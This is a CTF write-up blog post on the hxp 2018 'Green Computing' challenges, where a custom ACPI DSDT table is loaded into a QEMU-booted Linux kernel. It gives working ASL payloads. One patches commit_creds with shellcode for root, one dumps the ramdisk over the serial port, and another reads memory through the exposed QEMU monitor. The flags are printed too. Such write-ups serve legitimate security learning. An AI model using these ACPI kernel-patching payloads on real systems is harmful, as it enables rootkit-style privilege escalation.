---
title: Green Computing - hxp CTF 2018
date: '2018-12-10 21:28:01'
layout: post
---

* [Green Computing 1](#green-computing-1)
* [Green Computing 1 - Fixed](#green-computing-1---fixed)
* [Green Computing 2](#green-computing-2)

I really enjoyed this set of pwns, they were using ACPI tables which is something I had heard of but never really know what they were all about.

### Green Computing 1
> Please think of the environment before hacking this challenge.
> 
> Download:
> [Green Computing 1-233fe0907f5a76f1.tar.xz](https://2018.ctf.link/assets/files/Green%20Computing%201-233fe0907f5a76f1.tar.xz)
> 
>
> Connection:
> nc 195.201.114.175 13372

*57 Pts, 20 solved, pwn*

We are given an archive with a qemu script, and something a bit different:

```python
# Damn Chinese nation-state-level hackers added a tiny chip here :/
# Seems like they are injecting ACPI tables to save electricity O_O
# Please inform Bloomberg
tmp_dir = tempfile.mkdtemp(prefix='green_computing_', dir='/tmp')
os.chdir(tmp_dir)
os.makedirs('kernel/firmware/acpi')

with open('kernel/firmware/acpi/dsdt.aml', 'wb') as f:
  b = base64.b64decode(sys.stdin.readline(32 * 1024).strip())
  if b[:4] != b'DSDT':
    b = b''
  f.write(b)

os.system('find kernel | cpio -H newc --create --owner 0:0 > tables.cpio')
os.system('cat tables.cpio /home/ctf/init.cpio > init.gz')

os.system('qemu-system-x86_64 --version')
print('Booting ...\n', flush=True)
cmd = "qemu-system-x86_64 -m 1337M -kernel /home/ctf/bzImage -initrd init.gz -append 'console=ttyS0 nokaslr panic=-1' -nographic -no-reboot"
os.system(cmd)
```

We are able to overwrite the DSDT table with our own. I had no idea what this was at first, but after a bit of searching I came across a page on the archlinux wiki about [replacing the DSDT table](https://wiki.archlinux.org/index.php/DSDT#Recompiling_it_yourself). 

I noticed that the run script did not redirect the monitor to `/dev/null`, testing locally and remote this proved correct as `ctrl-a c` dropped us into the monitor! I guessed this was a mistake but decided to try get the flag before reporting it. Locally I dumped a chunk of physical memory and grepped for the flag:

```bash
(qemu) pmemsave 0 0x1000000 mem.bin`

$ xxd mem.bin |grep hxp
0038d000: 726f 6f74 3a78 3a30 3a0a 6878 703a 783a  root:x:0:.hxp:x:
0038e280: 6467 6964 2068 7870 2073 680a 0000 0000  dgid hxp sh.....
0038f020: 680a 6878 703a 783a 3130 3030 3a31 3030  h.hxp:x:1000:100
0038f030: 303a 6878 702c 2c2c 2c3a 2f68 6f6d 652f  0:hxp,,,,:/home/
0038f040: 6878 703a 2f62 696e 2f73 680a 0000 0000  hxp:/bin/sh.....
00390000: 6878 707b 2e2e 2e2e 2e2e 2e2e 2e2e 2e2e  hxp{............
```

So locally the flag is at `0x390000`, dumping the same region remotely shows us the init script:

```bash
(qemu) xp/100bc 0x390000
0000000000390000: '#' '!' '/' 'b' 'i' 'n' '/' 's'
0000000000390008: 'h' '\n' 's' 'e' 't' ' ' '-' 'e'
0000000000390010: 'u' 'o' ' ' 'p' 'i' 'p' 'e' 'f'
```

But if we keep looking a bit further we find the flag:
```bash
(qemu) xp/100bc 0x392000
xp/100bc 0x392000
0000000000392000: 'h' 'x' 'p' '{' 'p' 'l' '3' '4'
0000000000392008: '5' '3' '_' '4' 'u' 'd' '1' '7'
0000000000392010: '_' 'y' '0' 'u' 'r' '_' 'A' 'C'
0000000000392018: 'P' 'I' '_' '7' '4' 'b' 'l' '3'
0000000000392020: '5' '_' 'b' '3' 'f' '0' 'r' '3'
0000000000392028: '_' '7' 'h' '1' 'n' 'k' '1' '6'
0000000000392030: '_' '0' 'f' '_' '7' 'h' '3' '_'
0000000000392038: '3' 'n' 'v' '1' 'r' '0' 'n' 'm'
0000000000392040: '3' 'n' '7' '}' '\n' '\x00' '\x00' '\x00'
```

`hxp{pl3453_4ud17_y0ur_ACPI_74bl35_b3f0r3_7h1nk16_0f_7h3_3nv1r0nm3n7}`

I pinged an admin ([0xbb](https://github.com/0xbb) who was the challenge author, great work again!) and it was indeed a mistake, they dropped the points down and prepared a fixed version without the monitor :)

### Green Computing 1 - Fixed
> Please think of the environment before hacking this challenge.
> 
> Download:
> [Green Computing 1 - fixed-60ab55456a53352c.tar.xz](https://2018.ctf.link/assets/files/Green%20Computing%201%20-%20fixed-60ab55456a53352c.tar.xz)
> 
> Connection:
> nc 195.201.134.82 13376

*356 Pts, 8 solved, pwn*

An hour or so later the fixed version was up and running, so it was time to try solve the challenge the intended way. I followed the archlinux wiki to dump the existing table, increaded the OEM version, recompiled it, and sent it to the run script. The console logs contained `ACPI: Table Upgrade: override [DSDT-BOCHS -BXPCDSDT]` indicating that it had worked!

I spent a bit of time reading up on the ASL language and ACPI, and found a blackhat presentation called [Implementing and Detecting an ACPI BIOS Rootkit](https://www.blackhat.com/presentations/bh-europe-06/bh-eu-06-Heasman.pdf) and the [ACPI spec](http://www.acpi.info/DOWNLOADS/ACPI_5_Errata%20A.pdf) very helpful.

The blackhat slides had a great example of how you could overwrite part of the kernel:

```haskell
// OperationRegion to overwrite sys_ni_syscall()
OperationRegion(NISC, SystemMemory, 0x12BAE0, 0x40)
Field(NISC, AnyAcc, NoLock, Preserve)
{
  NICD, 0x40
}
Store(Buffer () {0xFF, 0xD3, 0xC3, 0x90, 0x90, 0x90, 0x90,0x90}, NICD)
```

This looked promising, and as kaslr was disabled, we should be able to patch the kernel to make us root. It took a while to work out how to get the code to actually run, but after looking through the spec I came across `_INI` which sounded promising:


> 6.5.1 _INI (Init)
> _INI is a device initialization object that performs device specific initialization.
> 

To test this we need to find the hardware address of the kernel. We know that it will be at the virtual address `0xffffffff81000000` without kaslr, we can use the qemu monitor to find the hardware mapping:

```bash
(qemu) info tlb
...
ffffffff81000000: 0000000001000000 -GPDA----
```

So the kernel is at `0x1000000`, lets try writing something using the following DSDT:

```haskell
DefinitionBlock ("", "DSDT", 1, "BOCHS ", "BXPCDSDT", 0x00000002)
{
  Method (_INI, 0, NotSerialized) {
    OperationRegion (PWDN, SystemMemory, 0x000000001000000, 4)
    Field (PWDN, AnyAcc, NoLock, Preserve)
    {
      ADDR, 32
    }
    ADDR = Buffer () { 0x12, 0x34, 0x56, 0x78 }
  }
}
```
```bash
(qemu) x/4wx 0xffffffff81000000
ffffffff81000000: 0x78563412 0xe800803f 0x000000d4 0xed3d8d48
```

It worked! Now we just need to find what to patch. It was getting a bit late so I decided to patch `commit_creds` to first call `prepare_kernel_cred(0)` everytime as I knew this would work. Adding `init=/bin/sh` to the `append` qemu flag allows us to stay as root and look at `/proc/kallsyms` to get the kernel symbol addresses:

```bash
/ # cat /proc/kallsyms | grep creds
ffffffff8104a9f0 T exit_creds
ffffffff8104aaa0 T prepare_creds
ffffffff8104ab60 T prepare_exec_creds
ffffffff8104ab70 T copy_creds
ffffffff8104ac20 T commit_creds
```

I wanted to hook `commit_creds` by jumping to my payload which would call `prepare_kernel_cred(0)`, run any instructions that were overwritten, then jump back. I found a nice place at `0xFFFFFFFF81241000` that was all nops so wrote the payload there. The final DSDT was:

```haskell
DefinitionBlock ("", "DSDT", 1, "BOCHS ", "BXPCDSDT", 0x00000002)
{
  Method (_INI, 0, NotSerialized) {
      // -- 0xFFFFFFFF81241000 space for payload
      OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
      Field (PWDN, AnyAcc, NoLock, Preserve)
      {
        JMPA, 0x400
      }
      
      // -- call prepare_kernel_cred(0)
      // -- asm -c 64 -f raw 'push r13; push r12; mov rax, 0xffffffff8104adc0; mov rdi, 0; call rax; mov rdi, rax; mov r13, [0xFFFFFFFF81839040]; push 0xFFFFFFFF8104AC30; ret;' |xxd -i
      JMPA = Buffer ()
      {                    
       0x41, 0x55, 0x41, 0x54, 0x48, 0xc7, 0xc0, 0xc0, 0xad, 0x04, 0x81, 0x48,
       0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x4c,
       0x8b, 0x2c, 0x25, 0x40, 0x90, 0x83, 0x81, 0x68, 0x30, 0xac, 0x04, 0x81,
       0xc3 
     }

      // -- 0xFFFFFFFF8104AC24 in commit_creds
      OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
      Field (NISC, AnyAcc, NoLock, Preserve)
      {
        NICD, 96
      }

      // -- asm -c 64 -f raw "mov rax, 0xFFFFFFFF81241000; jmp rax" |xxd -i
      NICD = Buffer ()
      {                    
       0x48, 0xc7, 0xc0, 0x00, 0x10, 0x24, 0x81, 0xff, 0xe0, 0x90, 0x90, 0x90
     }
     Return (One)
   }  
 
 }
```

`hxp{acpi_ACPI_we_hope_that_you_finally_used_these_tables_to_pwn!}`


### Green Computing 2
>Seems that the Energiewende is endangered by state-sponsored hackers. We asked our best engineers to apply all the hardening to save the planet.
>
>Download:
>Green Computing 2-376b0192c9f9d731.tar.xz
>
>Connection:
>nc 116.203.18.207 13371

*260 Pts, 5 solved, pwn*

The setup to this challenge was very similar to the first one, but `kaslr` is enable and instead of busybox there is a custom `/etc/init` binary. It doesn't seem to do too much apart from print a messane then shutdown the computer.

I spent a long time trying to write a DSDT method that would loop through the memory to try and find the kernel base address but I couldn't quite get it to work. I started looking for any addresses that were fixed, and found that the RAM disk was always at `0x538df000`. This contained the init.gz image so if I could print out that then I could extract the flag.

In the original DSDT table there was a `DBUG` method defined, and after a bit of searching I found that it was designed for [printing messages](https://chromium.googlesource.com/chromiumos/third_party/seabios/+/780.B/src/acpi-dsdt.dsl#40).

It didn't work for me but gave me an idea for what do to, I could write a similar method to write straigh to the serial port. A quick google led me to [osdev](https://wiki.osdev.org/Serial_Ports#Port_Addresses) which says the first serial port is mapped to ioport `0x3F8`. Modifying the original `DBUG` method to use this port instead:

```haskell
OperationRegion (DBG, SystemIO, 0x3f8, One)
Field (DBG, ByteAcc, NoLock, Preserve)
{
    DBGB,   8
}

Method (DBUG, 2, NotSerialized)
{
    Local1 = Arg1
    Local2 = Zero
    While ((Local2 < Local1))
    {
        DBGB = DerefOf (Arg0 [Local2])
        Local2++
    }
}

Method (_INI, 0, NotSerialized) {
    DBUG("Hello World!\n", 13)
}
```

Which after loading into qemu printed out:

```bash
Spectre V2 : Spectre mitigation: kernel not compiled with retpoline; no mitigation available!
Hello World!
The only safe & powersaving computer is turned off one!
\x00reboot: System halted
```

Great! So now we can dump the ram disk and extract the filesystem and the flag using the following DSDT:
```haskell
DefinitionBlock ("", "DSDT", 1, "BOCHS ", "BXPCDSDT", 0x00000002)
{
    Scope (\)
    {
        OperationRegion (DBG, SystemIO, 0x3f8, One)
        Field (DBG, ByteAcc, NoLock, Preserve)
        {
            DBGB,   8
        }

        Method (DBUG, 2, NotSerialized)
        {
            Local1 = Arg1
            Local2 = Zero
            While ((Local2 < Local1))
            {
                DBGB = DerefOf (Arg0 [Local2])
                Local2++
            }
        }

        Method (_INI, 0, NotSerialized) {
            OperationRegion (PWN1, SystemMemory, 0x538df000, 0x1000)
            Field (PWN1, AnyAcc, NoLock, Preserve)
            {
                MEM1, 0x8000,
            }

            DBUG(MEM1, 0x1000)
        }
    }
}
```

`hxp{1_7h0u6h7_w17h_KASLR_3v3ry7h1n6_w1ll_b3_f1n3_:(}`
